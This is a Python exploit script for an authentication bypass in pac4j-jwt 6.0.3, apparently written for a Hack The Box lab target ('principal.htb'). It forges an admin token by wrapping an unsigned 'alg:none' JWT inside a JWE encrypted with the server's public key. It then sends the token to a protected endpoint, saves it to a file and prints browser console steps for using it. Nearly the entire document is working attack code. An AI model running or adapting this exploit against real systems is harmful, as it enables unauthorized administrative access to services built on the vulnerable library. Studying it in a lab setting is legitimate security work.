#!/usr/bin/env python3
"""
CVE-2026-29000 — pac4j-jwt Authentication Bypass
================================================

Forges an admin JWT by exploiting a signature-verification bypass in
pac4j-jwt 6.0.3. The trick: wrap an *unsigned* PlainJWT ({"alg":"none"})
inside a valid JWE envelope encrypted to the server's public key. When the
server decrypts the JWE and tries to parse the inner token as a SignedJWT,
it gets `null` back and skips signature verification entirely.

Usage:
    python3 jwt.py [TARGET]

Example:
    python3 jwt.py http://principal.htb:8080
    python3 jwt.py http://<TARGET_IP>:8080

Environment:
    pip install jwcrypto requests

Output:
    Prints the forged JWE token and (on success) writes it to token.txt.
"""

import json
import time
import base64
import sys
import requests
from jwcrypto import jwk, jwe


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://principal.htb:8080"
TOKEN_OUT = "token.txt"

# Claims to inject. Override via CLI if you want a different role/user.
FORGED_SUB = "admin"
FORGED_ROLE = "ROLE_ADMIN"
FORGED_ISS = "principal-platform"
TOKEN_TTL = 3600  # seconds


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def b64url(data: bytes) -> str:
    """Base64url-encode without padding (JWT convention)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def banner(msg: str) -> None:
    print(f"[*] {msg}")


def ok(msg: str) -> None:
    print(f"[+] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}")


# ---------------------------------------------------------------------------
# Main exploit
# ---------------------------------------------------------------------------
def main() -> int:
    # --- Step 1: Fetch the server's RSA public key from JWKS -------------
    banner("Fetching JWKS...")
    try:
        resp = requests.get(f"{TARGET}/api/auth/jwks", timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        warn(f"JWKS fetch failed: {e}")
        return 1

    jwks = resp.json()
    keys = jwks.get("keys", [])
    if not keys:
        warn("JWKS response contains no keys")
        return 1

    key_data = keys[0]
    pub_key = jwk.JWK(**key_data)
    ok(f"Got RSA public key (kid: {key_data.get('kid', '?')})")

    # --- Step 2: Build the forged PlainJWT ------------------------------
    now = int(time.time())

    # Compact JSON (no spaces) — the server's parser is strict about this.
    header_json = json.dumps(
        {"alg": "none", "typ": "JWT"},
        separators=(",", ":"),
    )
    payload_json = json.dumps(
        {
            "sub": FORGED_SUB,
            "role": FORGED_ROLE,
            "iss": FORGED_ISS,
            "iat": now,
            "exp": now + TOKEN_TTL,
        },
        separators=(",", ":"),
    )

    header_b64 = b64url(header_json.encode())
    payload_b64 = b64url(payload_json.encode())

    # Trailing dot = empty signature segment → valid 3-part JWT.
    plain_jwt = f"{header_b64}.{payload_b64}."
    ok(f"Crafted PlainJWT with sub={FORGED_SUB}, role={FORGED_ROLE}")

    # --- Step 3: Wrap the PlainJWT inside a valid JWE -------------------
    try:
        jwe_token = jwe.JWE(
            plain_jwt.encode(),
            recipient=pub_key,
            protected=json.dumps(
                {
                    "alg": "RSA-OAEP-256",
                    "enc": "A128GCM",
                    "kid": key_data["kid"],
                    "cty": "JWT",
                }
            ),
        ).serialize(compact=True)
    except Exception as e:
        warn(f"JWE construction failed: {e}")
        return 1

    ok("Forged JWE token created")

    # --- Step 4: Test the token against a protected endpoint ------------
    print()
    banner("Accessing /api/dashboard...")
    try:
        r = requests.get(
            f"{TARGET}/api/dashboard",
            headers={"Authorization": f"Bearer {jwe_token}"},
            timeout=10,
        )
    except requests.RequestException as e:
        warn(f"Request failed: {e}")
        return 1

    print(f"[*] Status: {r.status_code}")

    if r.status_code != 200:
        warn(f"Bypass failed — response body: {r.text[:300]}")
        print()
        warn("Common causes:")
        print("    - Missing trailing dot on PlainJWT")
        print("    - JSON payload not compact (has spaces)")
        print("    - Target version is not pac4j-jwt 6.0.3")
        return 1

    # --- Success -------------------------------------------------------
    try:
        data = r.json()
        user = data.get("user", {})
        ok(f"Authenticated as: {user.get('username')} ({user.get('role')})")
    except ValueError:
        warn("Response was 200 but not valid JSON")

    with open(TOKEN_OUT, "w") as f:
        f.write(jwe_token)
    ok(f"Token saved to {TOKEN_OUT}")

    print()
    print("[*] To use in the browser, open DevTools (F12) → Console and run:")
    print(f"    sessionStorage.setItem('auth_token', '{jwe_token[:32]}...');")
    print("    location.reload();")
    return 0


if __name__ == "__main__":
    sys.exit(main())